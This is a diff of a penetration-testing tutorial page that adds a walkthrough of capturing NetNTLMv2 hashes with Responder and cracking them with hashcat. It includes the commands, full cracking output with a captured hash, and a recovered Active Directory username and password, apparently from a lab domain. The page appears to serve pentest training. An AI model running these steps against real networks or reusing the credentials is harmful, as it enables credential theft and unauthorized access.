@@ -12,20 +12,20 @@
     <title>Responder &#43; Hashcat :: Real Network Penetration Testing</title>
 
     
-    <link href="/css/nucleus.css?1678394567" rel="stylesheet">
-    <link href="/css/fontawesome-all.min.css?1678394567" rel="stylesheet">
-    <link href="/css/hybrid.css?1678394567" rel="stylesheet">
-    <link href="/css/featherlight.min.css?1678394567" rel="stylesheet">
-    <link href="/css/perfect-scrollbar.min.css?1678394567" rel="stylesheet">
-    <link href="/css/auto-complete.css?1678394567" rel="stylesheet">
-    <link href="/css/atom-one-dark-reasonable.css?1678394567" rel="stylesheet">
-    <link href="/css/theme.css?1678394567" rel="stylesheet">
-    <link href="/css/tabs.css?1678394567" rel="stylesheet">
-    <link href="/css/hugo-theme.css?1678394567" rel="stylesheet">
+    <link href="/css/nucleus.css?1678550771" rel="stylesheet">
+    <link href="/css/fontawesome-all.min.css?1678550771" rel="stylesheet">
+    <link href="/css/hybrid.css?1678550771" rel="stylesheet">
+    <link href="/css/featherlight.min.css?1678550771" rel="stylesheet">
+    <link href="/css/perfect-scrollbar.min.css?1678550771" rel="stylesheet">
+    <link href="/css/auto-complete.css?1678550771" rel="stylesheet">
+    <link href="/css/atom-one-dark-reasonable.css?1678550771" rel="stylesheet">
+    <link href="/css/theme.css?1678550771" rel="stylesheet">
+    <link href="/css/tabs.css?1678550771" rel="stylesheet">
+    <link href="/css/hugo-theme.css?1678550771" rel="stylesheet">
     
     
 
-    <script src="/js/jquery-3.3.1.min.js?1678394567"></script>
+    <script src="/js/jquery-3.3.1.min.js?1678550771"></script>
 
     <style>
       :root #header + #content > #left > #rlblock_left{
@@ -54,14 +54,14 @@
     <span data-search-clear=""><i class="fas fa-times"></i></span>
 </div>
 
-<script type="text/javascript" src="/js/lunr.min.js?1678394567"></script>
-<script type="text/javascript" src="/js/auto-complete.js?1678394567"></script>
+<script type="text/javascript" src="/js/lunr.min.js?1678550771"></script>
+<script type="text/javascript" src="/js/auto-complete.js?1678550771"></script>
 <script type="text/javascript">
     
         var baseurl = "";
     
 </script>
-<script type="text/javascript" src="/js/search.js?1678394567"></script>
+<script type="text/javascript" src="/js/search.js?1678550771"></script>
 
     
   </div>
@@ -871,7 +871,18 @@
                 
                     <div class="progress">
     <div class="wrapper">
-<nav id="TableOfContents"></nav>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-easy-creds-early-on">1. Easy Creds Early On</a></li>
+    <li><a href="#2-hashcat-ftw">2. Hashcat FTW!</a>
+      <ul>
+        <li><a href="#21-recover-cracked-hashes">2.1 Recover cracked Hashes</a></li>
+        <li><a href="#22-active-directory-credentials">2.2 Active Directory Credentials</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-additional-reading">3. Additional Reading</a></li>
+  </ul>
+</nav>
     </div>
 </div>
 
@@ -895,7 +906,60 @@
 
 
 
-	
+	<p><img src="./responder.png" alt=""></p>
+<h2 id="1-easy-creds-early-on">1. Easy Creds Early On</h2>
+<p>Usually something I&rsquo;ll throw up early as a passive credential harvester and just let it collect what i can while I do host/service discovery.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /opt/Responder/Responder.py -I enp0s10f0
+</span></span></code></pre></div><p><img src="./netntlmhash.png" alt=""></p>
+<h2 id="2-hashcat-ftw">2. Hashcat FTW!</h2>
+<p>You&rsquo;ll get all sorts of data back from Responder and not all of it will be useful to you.  <em>NTLMv2-SSP</em> hashes can be cracked using a dictionary attack provided you have a good wordlist.</p>
+<p>Catptured hashes are located in the <em>/opt/Responder/logs</em> directory</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls -lah /opt/Responder/logs/*.txt
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">703</span> Mar  <span style="color:#ae81ff">9</span> 14:57 SMB-NTLMv2-SSP-fe80::a9cb:9e69:758d:bf41.txt
+</span></span></code></pre></div><p>First you need to make sure you know which mode hashcat needs to run in.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hashcat --help | grep -i ntlmv2
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5600</span> | NetNTLMv2                                           | Network Protocol
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">27100</span> | NetNTLMv2 <span style="color:#f92672">(</span>NT<span style="color:#f92672">)</span>                                      | Network Protocol
+</span></span></code></pre></div><p>Now you can point hashcat at your has.txt file and specify your wordlist.  Try the <em>xato-net-10-million-passwords</em> list.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hashcat -m <span style="color:#ae81ff">5600</span> SMB-NTLMv2-SSP-fe80::a9cb:9e69:758d:bf41.txt /opt/SecLists/Passwords/xato-net-10-million-passwords.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RICHARD.F::sciencerocks:98bd140c962b2ac2:b0cd1d1422851056a76c292fbc5234f5:0101000000000000002c46649752d901283d4cf4235711ba0000000002000800590033004300560001001e00570049004e002d005a004a0036004f0054003700380047004e004e00340004003400570049004e002d005a004a0036004f0054003700380047004e004e0034002e0059003300430056002e004c004f00430041004c000300140059003300430056002e004c004f00430041004c000500140059003300430056002e004c004f00430041004c0007000800002c46649752d9010600040002000000080030003000000000000000000000000020000081f51e116b571c63f95c93c75f993952028cd833ab2d3bc6fa1caf3d22d964e70a001000000000000000000000000000000000000900200063006900660073002f006d0065006400690061002d00730072007600310037000000000000000000:Security24-7
+</span></span><span style="display:flex;"><span>                                                          
+</span></span><span style="display:flex;"><span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Cracked
+</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">5600</span> <span style="color:#f92672">(</span>NetNTLMv2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Hash.Target......: RICHARD.F::sciencerocks:98bd140c962b2ac2:b0cd1d1422...000000
+</span></span><span style="display:flex;"><span>Time.Started.....: Thu Mar  <span style="color:#ae81ff">9</span> 15:09:13 <span style="color:#ae81ff">2023</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">4</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Time.Estimated...: Thu Mar  <span style="color:#ae81ff">9</span> 15:09:17 <span style="color:#ae81ff">2023</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
+</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/opt/SecLists/Passwords/xato-net-10-million-passwords.txt<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Speed.#1.........:   898.3 kH/s <span style="color:#f92672">(</span>1.53ms<span style="color:#f92672">)</span> @ Accel:512 Loops:1 Thr:1 Vec:8
+</span></span><span style="display:flex;"><span>Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests
+</span></span><span style="display:flex;"><span>Progress.........: 3622912/5189454 <span style="color:#f92672">(</span>69.81%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Rejected.........: 0/3622912 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Point....: 3620864/5189454 <span style="color:#f92672">(</span>69.77%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
+</span></span><span style="display:flex;"><span>Candidates.#1....: Sen1Sen -&gt; Scan43PW
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Started: Thu Mar  <span style="color:#ae81ff">9</span> 15:09:12 <span style="color:#ae81ff">2023</span>
+</span></span><span style="display:flex;"><span>Stopped: Thu Mar  <span style="color:#ae81ff">9</span> 15:09:19 <span style="color:#ae81ff">2023</span>
+</span></span></code></pre></div><h3 id="21-recover-cracked-hashes">2.1 Recover cracked Hashes</h3>
+<p>We can tell from this line <em>Recovered&hellip;&hellip;..: 1/1 (100.00%) Digests</em> That hashcat was able to break the password.  And if you look above the clear-text password is acctually displayed to you in a less than obvious part of the screen.
+You can grab this clear-text value at any time with</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">5600</span> SMB-NTLMv2-SSP-fe80::a9cb:9e69:758d:bf41.txt --show
+</span></span></code></pre></div><p><img src="./cracked.png" alt=""></p>
+<h3 id="22-active-directory-credentials">2.2 Active Directory Credentials</h3>
+<ul>
+<li>Username: <code>sciencerocks\richard.f</code></li>
+<li>Password: <code>Security24-7</code></li>
+</ul>
+<h2 id="3-additional-reading">3. Additional Reading</h2>
+<p>This technique was first brought to my attention by Tim Medin from Red Siege.  Tim wrote the original <em>nbns_spoof.rb</em> Metasploit module.
+His research into discovering this attack vector is written here and you should read it.</p>
+<p><a href="http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html">http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html</a></p>
+
 
 
 
@@ -1378,19 +1442,19 @@
     <div style="left: -1000px; overflow: scroll; position: absolute; top: -1000px; border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;">
       <div style="border: none; box-sizing: content-box; height: 200px; margin: 0px; padding: 0px; width: 200px;"></div>
     </div>
-    <script src="/js/clipboard.min.js?1678394567"></script>
-    <script src="/js/perfect-scrollbar.min.js?1678394567"></script>
-    <script src="/js/perfect-scrollbar.jquery.min.js?1678394567"></script>
-    <script src="/js/jquery.sticky.js?1678394567"></script>
-    <script src="/js/featherlight.min.js?1678394567"></script>
-    <script src="/js/highlight.pack.js?1678394567"></script>
+    <script src="/js/clipboard.min.js?1678550771"></script>
+    <script src="/js/perfect-scrollbar.min.js?1678550771"></script>
+    <script src="/js/perfect-scrollbar.jquery.min.js?1678550771"></script>
+    <script src="/js/jquery.sticky.js?1678550771"></script>
+    <script src="/js/featherlight.min.js?1678550771"></script>
+    <script src="/js/highlight.pack.js?1678550771"></script>
     <script>hljs.initHighlightingOnLoad();</script>
-    <script src="/js/modernizr.custom-3.6.0.js?1678394567"></script>
-    <script src="/js/learn.js?1678394567"></script>
-    <script src="/js/hugo-learn.js?1678394567"></script>
+    <script src="/js/modernizr.custom-3.6.0.js?1678550771"></script>
+    <script src="/js/learn.js?1678550771"></script>
+    <script src="/js/hugo-learn.js?1678550771"></script>
     
         
-            <script src="/mermaid/mermaid.js?1678394567"></script>
+            <script src="/mermaid/mermaid.js?1678550771"></script>
         
         <script>
             mermaid.initialize({ startOnLoad: true });
